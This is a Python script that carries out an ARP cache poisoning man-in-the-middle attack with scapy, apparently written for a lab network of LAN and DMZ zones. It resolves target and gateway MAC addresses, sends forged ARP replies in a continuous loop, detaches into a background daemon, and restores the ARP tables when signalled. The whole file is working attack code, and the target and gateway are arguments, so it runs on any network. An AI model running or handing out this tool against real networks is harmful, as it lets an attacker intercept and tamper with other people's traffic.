#!/usr/bin/env python3
"""
ARP Cache Poisoning Attack Script
---------------------------------

This module implements an ARP cache poisoning attack in a segmented network topology
with trusted LAN and DMZ zones. The attack allows traffic interception between
hosts by manipulating the ARP tables of both a target host and the gateway router.

The script is designed to work with the provided network topology which consists of:
- Trusted LAN (10.1.0.0/24): Contains workstations (ws2, ws3)
- DMZ (10.12.0.0/24): Contains service servers (http, dns, ntp, ftp)
- Two routers (r1, r2) connecting these networks
- Internet connectivity through r2

By default, this targets the workstation ws3 (10.1.0.3) and the gateway router r1 (10.1.0.1),
effectively becoming a man-in-the-middle for all traffic between them.

Usage:
    python3 main.py [--target TARGET_IP] [--gateway GATEWAY_IP] [--http-server HTTP_IP]
"""
import os
import sys
import time
import signal
import argparse
from scapy.all import Ether, ARP, IP, TCP, RandShort, srp, send, conf

DETACH_THRESHOLD = 30
MAINTENANCE_INTERVAL = 5.0
INITIAL_INTERVAL = 0.5

target_ip = None
target_mac = None
gateway_ip = None
gateway_mac = None

conf.verb = 0


def resolve_mac(ip):
    """
    Resolve the MAC address of a target IP using ARP.

    This function broadcasts an ARP request to the network and waits for a response
    from the target host. It's a necessary first step in the ARP poisoning attack
    as we need the actual MAC addresses of both the target and gateway.

    Args:
        target_ip (str): The IP address to resolve to a MAC address

    Returns:
        str: The MAC address of the target, or None if resolution fails
    """
    ans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0)[0]
    return ans[0][1].hwsrc if ans else None


def poison_arp_cache(victim_ip, victim_mac, spoof_ip):
    """
    Send a spoofed ARP response to poison a target's ARP cache.

    This function creates and sends a forged ARP reply packet that tricks the victim
    into associating the spoofed source IP with the attacker's MAC address. In the
    custom topology, this function is used to:
    1. Make the workstation think the attacker is the router (r1)
    2. Make the router think the attacker is the workstation

    Args:
        victim_ip (str): The IP address of the target to poison
        victim_mac (str): The MAC address of the target
        spoofed_source_ip (str): The IP address to impersonate (gateway or target)
    """
    send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip), verbose=0)


def restore_network(signum=None, frame=None):
    """
    Restore the original ARP mappings after the attack.

    This function is crucial for proper cleanup after the attack is complete.
    It sends legitimate ARP replies to both the target workstation and the gateway
    router, restoring the correct MAC-to-IP mappings. Without this step, network
    communication would remain disrupted after the attack concludes.

    In our topology, this restores the original mappings between:
    - The workstation (e.g., ws3 at 10.1.0.3)
    - The gateway router (r1 at 10.1.0.1)

    Args:
        target_ip (str): IP address of the target workstation
        target_mac (str): MAC address of the target workstation
        gateway_ip (str): IP address of the gateway router
        gateway_mac (str): MAC address of the gateway router
    """
    print("\nRestoring ARP tables...")
    for _ in range(5):
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
                 psrc=gateway_ip, hwsrc=gateway_mac), verbose=0)
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                 psrc=target_ip, hwsrc=target_mac), verbose=0)
        time.sleep(0.2)
    sys.exit(0)


def daemonize():
    """
    Daemonize the process by forking and detaching from the controlling terminal.

    This function forks the current process, creates a new session, changes the working directory,
    and redirects standard I/O descriptors to /dev/null. It also sets up signal handlers to
    restore network settings upon receiving SIGTERM or SIGHUP.

    This ensures the attack runs in the background as a daemon process.
    """
    try:
        pid = os.fork()
        if pid > 0: sys.exit(0)
    except OSError as e:
        sys.stderr.write(f"Fork error: {e.errno} {e.strerror}\n")
        sys.exit(1)

    os.setsid()
    os.chdir("/")
    os.umask(0)

    sys.stdout.flush()
    sys.stderr.flush()
    with open(os.devnull, 'r') as f:
        os.dup2(f.fileno(), sys.stdin.fileno())
    with open(os.devnull, 'a+') as f:
        os.dup2(f.fileno(), sys.stdout.fileno())
        os.dup2(f.fileno(), sys.stderr.fileno())

    signal.signal(signal.SIGTERM, restore_network)
    signal.signal(signal.SIGHUP, restore_network)


def parse_arguments():
    """
    Parse command line arguments for the ARP poisoning attack.

    Configures default values appropriate for our network topology:
    - Target: ws3 (10.1.0.3) in the trusted LAN
    - Gateway: r1 (10.1.0.1) connecting the trusted LAN to the DMZ
    - HTTP Server: The web server (10.12.0.10) in the DMZ
    Returns:
        argparse.Namespace: The parsed command-line arguments
    """
    parser = argparse.ArgumentParser(description="ARP MITM Attack Tool")
    parser.add_argument("--target", required=True,
                        help="Target IP address (e.g., 10.1.0.3)")
    parser.add_argument("--gateway", required=True,
                        help="Gateway IP address (e.g., 10.1.0.1)")
    parser.add_argument("--http-server", default="10.12.0.10",
                        help="DMZ HTTP server IP (default: 10.12.0.10)")
    return parser.parse_args()


def main():
    """
    Main execution function for the ARP cache poisoning attack.

    This function orchestrates the attack workflow:
    1. Parse command-line arguments
    2. Send initial packets to populate ARP caches
    3. Resolve MAC addresses of the target and gateway
    4. Execute the ARP poisoning attack in a continuous loop
    5. Restore the network when interrupted

    The attack positions the attacker as a man-in-the-middle between a workstation
    in the trusted LAN and the gateway router, allowing traffic interception and
    potential manipulation.
    """
    global target_ip, target_mac, gateway_ip, gateway_mac

    args = parse_arguments()
    target_ip = args.target
    gateway_ip = args.gateway

    print(f"[*] ARP Cache Poisoning Attack")
    print(f"[*] Target: {target_ip}")
    print(f"[*] Gateway: {gateway_ip}")

    target_mac = resolve_mac(target_ip)
    gateway_mac = resolve_mac(gateway_ip)
    if not target_mac or not gateway_mac:
        print("[!] Failed to resolve MAC addresses")
        sys.exit(1)
    print(f"[+] Target MAC: {target_mac}")
    print(f"[+] Gateway MAC: {gateway_mac}")

    send(IP(dst=args.http_server, src=target_ip) / TCP(flags="S"), verbose=0)
    time.sleep(1)

    packet_count = 0
    start_time = time.time()
    print("[*] Starting ARP cache poisoning attack")

    try:
        while True:
            poison_arp_cache(target_ip, target_mac, gateway_ip)
            poison_arp_cache(gateway_ip, gateway_mac, target_ip)
            packet_count += 5

            if packet_count == DETACH_THRESHOLD:
                print("[*] Detaching process...")
                sys.stdout.flush()
                daemonize()

            if packet_count % 10 == 0 and packet_count <= DETACH_THRESHOLD:
                elapsed = time.time() - start_time
                print(f"[*] Sent {packet_count} packets in {elapsed:.1f}s")

            interval = INITIAL_INTERVAL if packet_count < DETACH_THRESHOLD else MAINTENANCE_INTERVAL
            time.sleep(interval)

    except KeyboardInterrupt:
        restore_network()


if __name__ == "__main__":
    main()